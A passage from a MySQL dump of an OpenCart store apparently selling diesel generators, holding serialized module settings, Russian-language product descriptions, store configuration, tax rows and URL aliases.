4;s:16:\"Контакты\";}s:6:\"avatar\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:12:\"thumb_status\";s:1:\"0\";s:8:\"template\";s:13:\"blog_menu.tpl\";s:6:\"anchor\";s:0:\"\";s:16:\"anchor_templates\";s:0:\"\";s:6:\"cached\";s:1:\"1\";s:8:\"counting\";s:1:\"1\";s:5:\"store\";a:1:{i:0;s:1:\"0\";}s:15:\"customer_groups\";a:4:{i:0;s:1:\"1\";i:1;s:2:\"-1\";i:2;s:2:\"-2\";i:3;s:2:\"-3\";}s:9:\"box_begin\";s:0:\"\";s:19:\"box_begin_templates\";s:0:\"\";s:7:\"box_end\";s:0:\"\";s:17:\"box_end_templates\";s:0:\"\";s:9:\"doc_ready\";s:1:\"1\";s:4:\"ajax\";s:1:\"0\";s:8:\"reserved\";s:0:\"\";}i:6;a:45:{s:6:\"remove\";s:0:\"\";s:4:\"type\";s:6:\"latest\";s:17:\"title_list_latest\";a:3:{i:1;s:10:\"Блоги\";i:3;s:10:\"Блоги\";i:4;s:10:\"Блоги\";}s:6:\"avatar\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:11:\"images_view\";s:1:\"1\";s:8:\"template\";s:9:\"blogs.tpl\";s:6:\"cached\";s:1:\"1\";s:12:\"modal_status\";s:1:\"0\";s:14:\"template_modal\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:6:\"anchor\";s:0:\"\";s:16:\"anchor_templates\";s:0:\"\";s:17:\"number_per_widget\";s:0:\"\";s:10:\"pagination\";s:1:\"1\";s:5:\"limit\";s:1:\"0\";s:4:\"sort\";s:1:\"0\";s:12:\"desc_symbols\";s:0:\"\";s:10:\"desc_words\";s:0:\"\";s:9:\"desc_pred\";s:0:\"\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:13:\"author_status\";s:1:\"0\";s:13:\"avatar_status\";s:1:\"1\";s:12:\"title_status\";s:1:\"1\";s:18:\"description_status\";s:1:\"1\";s:15:\"category_status\";s:1:\"1\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"0\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"0\";s:11:\"view_rating\";s:1:\"0\";s:15:\"category_button\";s:1:\"1\";s:5:\"blogs\";a:1:{i:0;s:1:\"8\";}s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:9:\"box_begin\";s:0:\"\";s:19:\"box_begin_templates\";s:0:\"\";s:7:\"box_end\";s:0:\"\";s:17:\"box_end_templates\";s:0:\"\";s:5:\"store\";a:1:{i:0;s:1:\"0\";}s:15:\"customer_groups\";a:4:{i:0;s:1:\"1\";i:1;s:2:\"-1\";i:2;s:2:\"-2\";i:3;s:2:\"-3\";}s:9:\"doc_ready\";s:1:\"1\";s:4:\"ajax\";s:1:\"0\";s:8:\"reserved\";s:0:\"\";}i:7;a:45:{s:6:\"remove\";s:0:\"\";s:4:\"type\";s:6:\"latest\";s:17:\"title_list_latest\";a:3:{i:1;s:14:\"Новости\";i:3;s:14:\"Новости\";i:4;s:14:\"Новости\";}s:6:\"avatar\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:11:\"images_view\";s:1:\"1\";s:8:\"template\";s:8:\"news.tpl\";s:6:\"cached\";s:1:\"1\";s:12:\"modal_status\";s:1:\"0\";s:14:\"template_modal\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:6:\"anchor\";s:0:\"\";s:16:\"anchor_templates\";s:0:\"\";s:17:\"number_per_widget\";s:0:\"\";s:10:\"pagination\";s:1:\"0\";s:5:\"limit\";s:1:\"0\";s:4:\"sort\";s:1:\"0\";s:12:\"desc_symbols\";s:0:\"\";s:10:\"desc_words\";s:0:\"\";s:9:\"desc_pred\";s:0:\"\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:13:\"author_status\";s:1:\"0\";s:13:\"avatar_status\";s:1:\"1\";s:12:\"title_status\";s:1:\"1\";s:18:\"description_status\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"0\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"0\";s:11:\"view_rating\";s:1:\"1\";s:15:\"category_button\";s:1:\"0\";s:5:\"blogs\";a:1:{i:0;s:1:\"9\";}s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:9:\"box_begin\";s:0:\"\";s:19:\"box_begin_templates\";s:0:\"\";s:7:\"box_end\";s:0:\"\";s:17:\"box_end_templates\";s:0:\"\";s:5:\"store\";a:1:{i:0;s:1:\"0\";}s:15:\"customer_groups\";a:4:{i:0;s:1:\"1\";i:1;s:2:\"-1\";i:2;s:2:\"-2\";i:3;s:2:\"-3\";}s:9:\"doc_ready\";s:1:\"1\";s:4:\"ajax\";s:1:\"0\";s:8:\"reserved\";s:0:\"\";}i:8;a:45:{s:6:\"remove\";s:0:\"\";s:4:\"type\";s:6:\"latest\";s:17:\"title_list_latest\";a:3:{i:1;s:14:\"Проекты\";i:3;s:14:\"Проекты\";i:4;s:14:\"Проекты\";}s:6:\"avatar\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:11:\"images_view\";s:1:\"1\";s:8:\"template\";s:12:\"projects.tpl\";s:6:\"cached\";s:1:\"1\";s:12:\"modal_status\";s:1:\"0\";s:14:\"template_modal\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:6:\"anchor\";s:0:\"\";s:16:\"anchor_templates\";s:0:\"\";s:17:\"number_per_widget\";s:0:\"\";s:10:\"pagination\";s:1:\"0\";s:5:\"limit\";s:1:\"0\";s:4:\"sort\";s:1:\"0\";s:12:\"desc_symbols\";s:0:\"\";s:10:\"desc_words\";s:0:\"\";s:9:\"desc_pred\";s:0:\"\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:13:\"author_status\";s:1:\"0\";s:13:\"avatar_status\";s:1:\"1\";s:12:\"title_status\";s:1:\"1\";s:18:\"description_status\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"0\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"0\";s:11:\"view_rating\";s:1:\"1\";s:15:\"category_button\";s:1:\"0\";s:5:\"blogs\";a:1:{i:0;s:2:\"10\";}s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:9:\"box_begin\";s:0:\"\";s:19:\"box_begin_templates\";s:0:\"\";s:7:\"box_end\";s:0:\"\";s:17:\"box_end_templates\";s:0:\"\";s:5:\"store\";a:1:{i:0;s:1:\"0\";}s:15:\"customer_groups\";a:4:{i:0;s:1:\"1\";i:1;s:2:\"-1\";i:2;s:2:\"-2\";i:3;s:2:\"-3\";}s:9:\"doc_ready\";s:1:\"1\";s:4:\"ajax\";s:1:\"0\";s:8:\"reserved\";s:0:\"\";}i:9;a:45:{s:6:\"remove\";s:0:\"\";s:4:\"type\";s:6:\"latest\";s:17:\"title_list_latest\";a:3:{i:1;s:12:\"Услуги\";i:3;s:8:\"Services\";i:4;s:14:\"Послуги\";}s:6:\"avatar\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:11:\"images_view\";s:1:\"1\";s:8:\"template\";s:12:\"services.tpl\";s:6:\"cached\";s:1:\"1\";s:12:\"modal_status\";s:1:\"0\";s:14:\"template_modal\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:6:\"anchor\";s:0:\"\";s:16:\"anchor_templates\";s:0:\"\";s:17:\"number_per_widget\";s:0:\"\";s:10:\"pagination\";s:1:\"0\";s:5:\"limit\";s:1:\"0\";s:4:\"sort\";s:1:\"0\";s:12:\"desc_symbols\";s:0:\"\";s:10:\"desc_words\";s:0:\"\";s:9:\"desc_pred\";s:0:\"\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:13:\"author_status\";s:1:\"0\";s:13:\"avatar_status\";s:1:\"1\";s:12:\"title_status\";s:1:\"1\";s:18:\"description_status\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"0\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"0\";s:11:\"view_rating\";s:1:\"1\";s:15:\"category_button\";s:1:\"0\";s:5:\"blogs\";a:1:{i:0;s:1:\"6\";}s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:9:\"box_begin\";s:0:\"\";s:19:\"box_begin_templates\";s:0:\"\";s:7:\"box_end\";s:0:\"\";s:17:\"box_end_templates\";s:0:\"\";s:5:\"store\";a:1:{i:0;s:1:\"0\";}s:15:\"customer_groups\";a:4:{i:0;s:1:\"1\";i:1;s:2:\"-1\";i:2;s:2:\"-2\";i:3;s:2:\"-3\";}s:9:\"doc_ready\";s:1:\"1\";s:4:\"ajax\";s:1:\"0\";s:8:\"reserved\";s:0:\"\";}}',1),(1035,0,'filter','filter_status','1',0),(1881,0,'prodline','prodline_status','1',0),(1882,0,'prodline','prodline','a:2:{i:0;a:3:{s:5:\"title\";a:3:{i:1;s:3:\"SMM\";i:3;s:3:\"SMM\";i:4;s:3:\"SMM\";}s:4:\"desc\";a:3:{i:1;s:1617:\"&lt;p&gt;В качестве силовых агрегатов используются экономичные и недорогие двигатели производства Минского моторного завода, которые уже давно зарекомендовали себя в украинском агро-секторе, как надёжные и качественные моторы, неприхотливые к топливу и простые в обслуживании. В качестве источников переменного тока используются генераторы производства Mecc Alte и Marelli Motori - надёжные и качественные альтернаторы с очень высоким сроком службы, собирающиеся на заводах в Италии и Малайзии. Система управления СКДГ-1 собственной разработки создана с учётом многолетней практики наших инженеров и пожеланий потребителей. Украинский и русский язык интерфейса и использование только качественных комплектующих обеспечивает удобство в управлении и надежность в эксплуатации. Рама из металла повышенной прочности (в два раза толще аналогов), со встроенным топливным баком.&amp;nbsp;&lt;br&gt;&lt;/p&gt;\";i:3;s:1684:\"&lt;p&gt;&lt;span style=&quot;line-height: 17.1429px;&quot;&gt;В качестве силовых агрегатов используются экономичные и недорогие двигатели производства Минского моторного завода, которые уже давно зарекомендовали себя в украинском агро-секторе, как надёжные и качественные моторы, неприхотливые к топливу и простые в обслуживании. В качестве источников переменного тока используются генераторы производства Mecc Alte и Marelli Motori - надёжные и качественные альтернаторы с очень высоким сроком службы, собирающиеся на заводах в Италии и Малайзии. Система управления СКДГ-1 собственной разработки создана с учётом многолетней практики наших инженеров и пожеланий потребителей. Украинский и русский язык интерфейса и использование только качественных комплектующих обеспечивает удобство в управлении и надежность в эксплуатации. Рама из металла повышенной прочности (в два раза толще аналогов), со встроенным топливным баком.&amp;nbsp;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;\";i:4;s:1684:\"&lt;p&gt;&lt;span style=&quot;line-height: 17.1429px;&quot;&gt;В качестве силовых агрегатов используются экономичные и недорогие двигатели производства Минского моторного завода, которые уже давно зарекомендовали себя в украинском агро-секторе, как надёжные и качественные моторы, неприхотливые к топливу и простые в обслуживании. В качестве источников переменного тока используются генераторы производства Mecc Alte и Marelli Motori - надёжные и качественные альтернаторы с очень высоким сроком службы, собирающиеся на заводах в Италии и Малайзии. Система управления СКДГ-1 собственной разработки создана с учётом многолетней практики наших инженеров и пожеланий потребителей. Украинский и русский язык интерфейса и использование только качественных комплектующих обеспечивает удобство в управлении и надежность в эксплуатации. Рама из металла повышенной прочности (в два раза толще аналогов), со встроенным топливным баком.&amp;nbsp;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;\";}s:10:\"sort_order\";s:1:\"0\";}i:1;a:3:{s:5:\"title\";a:3:{i:1;s:3:\"SSP\";i:3;s:3:\"SSP\";i:4;s:3:\"SSP\";}s:4:\"desc\";a:3:{i:1;s:1271:\"&lt;p&gt;Дизель-генераторы серии SSP предназначены для использования в качестве источников электроэнергии, автоматизированных по 1-3 степени ГОСТ 13822-82 для питания различных потребителей, имеющих силовую и осветительную нагрузки. Электростанции серии SSP соответствуют стандартам: ДСТУ CISPR 14-1:2004, ДСТУ IEC 61000-4-2:2008, ГОСТ 12.2.007.0-75. Дизельные генераторы серии SSP могут быть реализованы в стационарном открытом исполнении, под капотом, в контейнере, а также могут входить в состав передвижных электростанций. Дизельные электростанции серии SSP выпускаются в диапазоне мощностей от 16 до 200 кВт по стандартной номенклатуре и в диапазоне мощностей от 280 до 1600 кВт по индивидуальному заказу&amp;nbsp; &amp;nbsp;&lt;br&gt;&lt;/p&gt;\";i:3;s:1250:\"&lt;p&gt;Дизель-генераторы серии SSP предназначены для использования в качестве источников электроэнергии, автоматизированных по 1-3 степени ГОСТ 13822-82 для питания различных потребителей, имеющих силовую и осветительную нагрузки. Электростанции серии SSP соответствуют стандартам: ДСТУ CISPR 14-1:2004, ДСТУ IEC 61000-4-2:2008, ГОСТ 12.2.007.0-75. Дизельные генераторы серии SSP могут быть реализованы в стационарном открытом исполнении, под капотом, в контейнере, а также могут входить в состав передвижных электростанций. Дизельные электростанции серии SSP выпускаются в диапазоне мощностей от 16 до 200 кВт по стандартной номенклатуре и в диапазоне мощностей от 280 до 1600 кВт по индивидуальному заказу&lt;br&gt;&lt;/p&gt;\";i:4;s:1250:\"&lt;p&gt;Дизель-генераторы серии SSP предназначены для использования в качестве источников электроэнергии, автоматизированных по 1-3 степени ГОСТ 13822-82 для питания различных потребителей, имеющих силовую и осветительную нагрузки. Электростанции серии SSP соответствуют стандартам: ДСТУ CISPR 14-1:2004, ДСТУ IEC 61000-4-2:2008, ГОСТ 12.2.007.0-75. Дизельные генераторы серии SSP могут быть реализованы в стационарном открытом исполнении, под капотом, в контейнере, а также могут входить в состав передвижных электростанций. Дизельные электростанции серии SSP выпускаются в диапазоне мощностей от 16 до 200 кВт по стандартной номенклатуре и в диапазоне мощностей от 280 до 1600 кВт по индивидуальному заказу&lt;br&gt;&lt;/p&gt;\";}s:10:\"sort_order\";s:1:\"1\";}}',1),(1284,0,'blog_module','blog_module','a:7:{i:1;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:1:{i:0;s:1:\"1\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"3\";s:10:\"sort_order\";s:0:\"\";}i:2;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:17:{i:0;s:1:\"6\";i:1;s:2:\"10\";i:2;s:2:\"15\";i:3;s:1:\"3\";i:4;s:1:\"7\";i:5;s:2:\"12\";i:6;s:1:\"4\";i:7;s:1:\"1\";i:8;s:2:\"11\";i:9;s:1:\"5\";i:10;s:1:\"2\";i:11;s:2:\"16\";i:12;s:2:\"13\";i:13;s:1:\"9\";i:14;s:1:\"8\";i:15;s:2:\"17\";i:16;s:2:\"14\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"4\";s:10:\"sort_order\";s:0:\"\";}i:3;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:17:{i:0;s:1:\"6\";i:1;s:2:\"10\";i:2;s:2:\"15\";i:3;s:1:\"3\";i:4;s:1:\"7\";i:5;s:2:\"12\";i:6;s:1:\"4\";i:7;s:1:\"1\";i:8;s:2:\"11\";i:9;s:1:\"5\";i:10;s:1:\"2\";i:11;s:2:\"16\";i:12;s:2:\"13\";i:13;s:1:\"9\";i:14;s:1:\"8\";i:15;s:2:\"17\";i:16;s:2:\"14\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"5\";s:10:\"sort_order\";s:0:\"\";}i:4;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:1:{i:0;s:2:\"20\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"6\";s:10:\"sort_order\";s:0:\"\";}i:5;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:1:{i:0;s:2:\"21\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"7\";s:10:\"sort_order\";s:0:\"\";}i:6;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:1:{i:0;s:2:\"22\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"8\";s:10:\"sort_order\";s:0:\"\";}i:0;a:7:{s:12:\"url_template\";s:1:\"0\";s:3:\"url\";s:0:\"\";s:9:\"layout_id\";a:1:{i:0;s:2:\"23\";}s:8:\"position\";s:14:\"content_bottom\";s:6:\"status\";s:1:\"1\";s:4:\"what\";s:1:\"9\";s:10:\"sort_order\";s:0:\"\";}}',1),(2201,0,'config','config_image_additional_height','74',0),(2200,0,'config','config_image_additional_width','74',0),(2199,0,'config','config_image_product_height','228',0),(2198,0,'config','config_image_product_width','228',0),(2197,0,'config','config_image_popup_height','500',0),(2196,0,'config','config_image_popup_width','500',0),(2195,0,'config','config_image_thumb_height','228',0),(2194,0,'config','config_image_thumb_width','228',0),(2192,0,'config','config_image_category_width','80',0),(2193,0,'config','config_image_category_height','80',0),(2191,0,'config','config_icon','catalog/cart.png',0),(2190,0,'config','config_logo','catalog/logo.png',0),(2189,0,'config','config_return_status_id','2',0),(2188,0,'config','config_return_id','0',0),(2187,0,'config','config_affiliate_mail','0',0),(2186,0,'config','config_affiliate_id','4',0),(2185,0,'config','config_affiliate_commission','5',0),(2184,0,'config','config_affiliate_auto','0',0),(2182,0,'config','config_stock_checkout','0',0),(2183,0,'config','config_affiliate_approval','0',0),(2181,0,'config','config_stock_warning','0',0),(2180,0,'config','config_stock_display','0',0),(2179,0,'config','config_order_mail','1',0),(2178,0,'config','config_complete_status','a:1:{i:0;s:1:\"5\";}',1),(2177,0,'config','config_processing_status','a:1:{i:0;s:1:\"2\";}',1),(2174,0,'config','config_checkout_guest','1',0),(2175,0,'config','config_checkout_id','5',0),(2176,0,'config','config_order_status_id','1',0),(2172,0,'config','config_api_id','1',0),(2162,0,'config','config_tax_default','shipping',0),(2173,0,'config','config_cart_weight','1',0),(2171,0,'config','config_invoice_prefix','INV-2015-00',0),(2170,0,'config','config_account_mail','0',0),(2169,0,'config','config_account_id','3',0),(2167,0,'config','config_customer_price','0',0),(2168,0,'config','config_login_attempts','5',0),(2166,0,'config','config_customer_group_display','a:1:{i:0;s:1:\"1\";}',1),(2165,0,'config','config_customer_group_id','1',0),(2164,0,'config','config_customer_online','0',0),(2163,0,'config','config_tax_customer','shipping',0),(2161,0,'config','config_tax','0',0),(2160,0,'config','config_voucher_max','1000',0),(2159,0,'config','config_voucher_min','1',0),(2157,0,'config','config_review_guest','1',0),(2158,0,'config','config_review_mail','0',0),(2155,0,'config','config_limit_admin','20',0),(2156,0,'config','config_review_status','1',0),(2149,0,'config','config_currency_auto','1',0),(2150,0,'config','config_length_class_id','1',0),(2151,0,'config','config_weight_class_id','1',0),(2152,0,'config','config_product_count','1',0),(2153,0,'config','config_product_limit','15',0),(2154,0,'config','config_product_description_length','100',0),(2148,0,'config','config_currency','UAH',0),(2145,0,'config','config_zone_id','139',0),(2146,0,'config','config_language','ru',0),(2147,0,'config','config_admin_language','ru',0),(2135,0,'config','config_fax','495 888-88-88',0),(2136,0,'config','config_image','',0),(2137,0,'config','config_open','',0),(2138,0,'config','config_comment','',0),(2139,0,'config','config_meta_title','Интернет магазин Спец-сервис',0),(2140,0,'config','config_meta_description','Мой магазин',0),(2141,0,'config','config_meta_keyword','',0),(2142,0,'config','config_template','service',0),(2143,0,'config','config_layout_id','4',0),(2144,0,'config','config_country_id','220',0),(2134,0,'config','config_telephone','495 999-99-99',0),(2133,0,'config','config_email','mkovetsky@gmail.com',0),(2132,0,'config','config_geocode','',0),(2131,0,'config','config_address','г. Москва, ул. Ленина 10 оф. 32',0),(2130,0,'config','config_owner','Иванов Иван',0),(2129,0,'config','config_name','Интернет магазин Opencart &quot;Русская сборка&quot;',0),(2233,0,'config','config_maintenance','0',0),(2234,0,'config','config_password','1',0),(2235,0,'config','config_encryption','ff6d9b8a3a2581d0caca7cd853fbb6da',0),(2236,0,'config','config_compression','0',0),(2237,0,'config','config_error_display','0',0),(2238,0,'config','config_error_log','0',0),(2239,0,'config','config_error_filename','error.log',0),(2240,0,'config','config_google_analytics','',0),(2241,0,'config','config_google_analytics_status','0',0),(2242,0,'config','config_google_captcha_public','',0),(2243,0,'config','config_google_captcha_secret','',0),(2244,0,'config','config_google_captcha_status','0',0);
/*!40000 ALTER TABLE `oc_setting` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_stock_status` WRITE;
/*!40000 ALTER TABLE `oc_stock_status` DISABLE KEYS */;
INSERT INTO `oc_stock_status` VALUES (7,1,'В наличии'),(8,1,'Предзаказ'),(5,1,'Нет в наличии'),(6,1,'Ожидание 2-3 дня'),(5,4,'Нет в наличии'),(8,4,'Предзаказ'),(7,4,'В наличии'),(7,3,'В наличии'),(8,3,'Предзаказ'),(5,3,'Нет в наличии'),(6,3,'Ожидание 2-3 дня'),(6,4,'Ожидание 2-3 дня');
/*!40000 ALTER TABLE `oc_stock_status` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_store` WRITE;
/*!40000 ALTER TABLE `oc_store` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_tax_class` WRITE;
/*!40000 ALTER TABLE `oc_tax_class` DISABLE KEYS */;
INSERT INTO `oc_tax_class` VALUES (9,'Налоги','Облагаемые налогом','2014-06-06 23:00:00','2014-09-09 11:50:31');
/*!40000 ALTER TABLE `oc_tax_class` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_tax_rate` WRITE;
/*!40000 ALTER TABLE `oc_tax_rate` DISABLE KEYS */;
INSERT INTO `oc_tax_rate` VALUES (87,3,'НДС','18.0000','F','2011-09-21 21:49:23','2014-09-09 11:49:32');
/*!40000 ALTER TABLE `oc_tax_rate` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_tax_rate_to_customer_group` WRITE;
/*!40000 ALTER TABLE `oc_tax_rate_to_customer_group` DISABLE KEYS */;
INSERT INTO `oc_tax_rate_to_customer_group` VALUES (86,1),(87,1);
/*!40000 ALTER TABLE `oc_tax_rate_to_customer_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_tax_rule` WRITE;
/*!40000 ALTER TABLE `oc_tax_rule` DISABLE KEYS */;
INSERT INTO `oc_tax_rule` VALUES (121,10,86,'payment',1),(120,10,87,'store',0),(127,9,87,'shipping',2);
/*!40000 ALTER TABLE `oc_tax_rule` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_upload` WRITE;
/*!40000 ALTER TABLE `oc_upload` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_upload` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_url_alias` WRITE;
/*!40000 ALTER TABLE `oc_url_alias` DISABLE KEYS */;
INSERT INTO `oc_url_alias` VALUES (730,'manufacturer_id=8','apple'),(772,'information_id=4','about_us'),(991,'product_id=42','test'),(1087,'category_id=66','komplektujuschie'),(1287,'product_id=70','SSD - 10'),(970,'information_id=7','foto'),(1335,'category_id=72','dizel-generatory1'),(1289,'product_id=78','ssd-120'),(1290,'product_id=79','ssd-150'),(828,'manufacturer_id=9','canon'),(829,'manufacturer_id=5','htc'),(830,'manufacturer_id=7','hewlett-packard'),(831,'manufacturer_id=6','palm'),(832,'manufacturer_id=10','sony'),(841,'information_id=6','delivery'),(842,'information_id=3','privacy'),(843,'information_id=5','terms'),(845,'common/home',''),(846,'information/contact','contact-us'),(847,'information/sitemap','sitemap'),(848,'product/special','specials'),(849,'product/manufacturer','brands'),(850,'product/compare','compare-products'),(851,'product/search','search'),(852,'checkout/cart','cart'),(853,'checkout/checkout','checkout'),(854,'account/login','login'),(855,'account/logout','logout'),(856,'account/voucher','vouchers'),(857,'account/wishlist','wishlist'),(858,'account/account','my-account'),(859,'account/order','order-history'),(860,'account/newsletter','newsletter'),(861,'account/return/add','return-add'),(862,'account/forgotten','forgot-password'),(863,'account/download','downloads'),(864,'account/return','returns'),(865,'account/transaction','transactions'),(866,'account/register','create-account'),(867,'account/recurring','recurring'),(868,'account/address','address-book'),(869,'account/reward','reward-points'),(870,'account/edit','edit-account'),(871,'account/password','change-password'),(880,'affiliate/forgotten','affiliate-forgot-password'),(881,'affiliate/register','create-affiliate-account'),(882,'affiliate/login','affiliate-login'),(883,'affiliate/payment','affiliate-payment'),(884,'affiliate/tracking','affiliate-tracking'),(885,'affiliate/transaction','affiliate-transaction'),(886,'affiliate/account','affiliates'),(1288,'product_id=77','ssd-100'),(1298,'product_id=76','ssd-80'),(1291,'product_id=71','ssd-16'),(1294,'product_id=72','ssd-25'),(1296,'product_id=73','ssd-30'),(1300,'product_id=74','ssd-45'),(1299,'product_id=75','ssd-60'),(1049,'manufacturer_id=11','spets-servis'),(1307,'product_id=50','SSI-40 '),(1309,'product_id=53','SSI-64'),(1310,'product_id=52','SSI-96 '),(1303,'product_id=54','SSI-136 '),(1304,'product_id=55','SSI-160 '),(1305,'product_id=56','SSI-200 '),(1306,'product_id=57','SSI-240 '),(1308,'product_id=58','SSI-400 '),(1312,'product_id=59','SSM-16-L '),(1313,'product_id=60','SSM-20 '),(1314,'product_id=61','SSM-22 '),(1315,'product_id=62','SSM-25 '),(1316,'product_id=63','SSM-30 '),(1317,'product_id=64','SSM-40 '),(1318,'product_id=65','SSM-48 '),(1319,'product_id=66','SSM-60 '),(1320,'product_id=67','SSM-74 '),(1321,'product_id=68','SSM-84 '),(1311,'product_id=69','SSM-100 '),(1292,'product_id=80','ssd-200'),(1293,'product_id=81','ssd-240'),(1295,'product_id=82','ssd-280'),(1297,'product_id=83','ssd-320'),(1302,'product_id=84','ssd-360'),(1301,'product_id=85','ssd-400'),(1322,'product_id=86','ssv'),(1332,'product_id=87','ssv-100'),(1331,'product_id=88','ssv-120'),(1330,'product_id=89','ssv-150'),(1329,'product_id=90','ssv-200'),(1328,'product_id=91','ssv-280'),(1327,'product_id=92','ssv-320'),(1326,'product_id=93','ssv-360'),(1325,'product_id=94','ssv-400'),(1324,'product_id=95','ssv-450'),(1323,'product_id=96','ssv-500'),(1333,'product_id=98',''),(1334,'product_id=97','ssp-16');
/*!40000 ALTER TABLE `oc_url_alias` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_url_alias_blog` WRITE;
/*!40000 ALTER TABLE `oc_url_alias_blog` DISABLE KEYS */;
INSERT INTO `oc_url_alias_blog` VALUES (67,'record_id=1','pervaja-zapis',4),(66,'record_id=1','razdel-o-dizelnyh-generatorah',3),(187,'record_id=2','razdel-o-konversionnyh-elektrostantsijah',4),(186,'record_id=2','razdel-o-konversionnyh-elektrostantsijah',3),(185,'record_id=2','razdel-o-konversionnyh-elektrostantsijah',1),(18,'blog_id=1','test-kateg',3),(17,'blog_id=1','test-kateg',1),(19,'blog_id=1','test-kateg',4),(136,'blog_id=6','poslugi',4),(135,'blog_id=6','services',3),(134,'blog_id=6','uslugi',1),(32,'blog_id=4','kompanija',1),(33,'blog_id=4','company',3),(34,'blog_id=4','kompanija',4),(196,'record_id=6','novaja-usluga',4),(55,'blog_id=5','kontakti',4),(54,'blog_id=5','contacts',3),(53,'blog_id=5','kontakty',1),(195,'record_id=6','novaja-usluga',3),(194,'record_id=6','REMONT',1),(65,'record_id=1','pervaja-zapis',1),(190,'record_id=3','razdel-o-sistemah-upravlenija-dgu',4),(189,'record_id=3','razdel-o-sistemah-upravlenija-dgu',3),(188,'record_id=3','razdel-o-sistemah-upravlenija-dgu',1),(92,'record_id=7','zakazat-obratnyj-zvonok',1),(93,'record_id=7','zakazat-obratnyj-zvonok',3),(94,'record_id=7','zakazat-obratnyj-zvonok',4),(133,'blog_id=8','blogi',4),(132,'blog_id=8','blogi',3),(131,'blog_id=8','blogi',1),(169,'record_id=8','blog1',4),(168,'record_id=8','blog1',3),(167,'record_id=8','blog1',1),(130,'record_id=9','blog2',4),(129,'record_id=9','blog2',3),(128,'record_id=9','blog2',1),(145,'record_id=10','blog-3',4),(144,'record_id=10','blog-3',3),(143,'record_id=10','blog-3',1),(146,'blog_id=9','novosti',1),(147,'blog_id=9','novosti',3),(148,'blog_id=9','novosti',4),(149,'record_id=11','novost-1',1),(150,'record_i